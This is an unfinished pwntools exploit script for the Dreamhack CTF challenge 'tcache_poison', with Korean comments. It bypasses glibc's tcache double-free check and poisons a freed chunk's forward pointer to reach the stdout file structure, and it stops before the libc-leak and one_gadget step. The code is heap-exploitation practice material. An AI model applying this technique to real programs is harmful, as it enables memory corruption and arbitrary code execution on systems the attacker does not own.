from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.arch = "amd64"
context.log_level = "debug"

# Local
#"""
p = process("./tcache_poison")
#"""

# Online
"""
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host"+str(HOST)+".dreamhack.games", PORT)
"""

elf = ELF("./tcache_poison")
libc = ELF("/lib/x86-64-linux-gnu/libc-2.27.so")

def alloc(size, data):
	p.sendlineafter("Edit\n", "1")
	p.sendlineafter(":", str(size))
	p.sendafter(":", data)

def free():
	p.sendlineafter("Edit\n", "2")

def print_chunk():
	p.sendlineafter("Edit\n", "3")

def edit(data):
	p.sendlineafter("Edit\n", "4")
	p.sendafter(":", data)

# [1] malloc 1회 생성	
alloc(0x30, "dreamhack")
free()

# [2] fd: AAAAAAAA, key 부분에 \x00 추가함으로써 DFB 우회
# 이후 tcache에 동일한 chunk 들어감
edit("A" * 0x8 + "\x00")
free()

# [3] stdout 
addr_stdout = elf.symbols["stdout"]
alloc(0x30, p64(addr_stdout))

# [4] fd에 stdout을 넣어 그 다음인 _IO_2_1_stdout_으로 연결
alloc(0x30, "B" * 0x8)
alloc(0x30, "\x60")

# [5] libc_base & one_gadget


p.interactive()
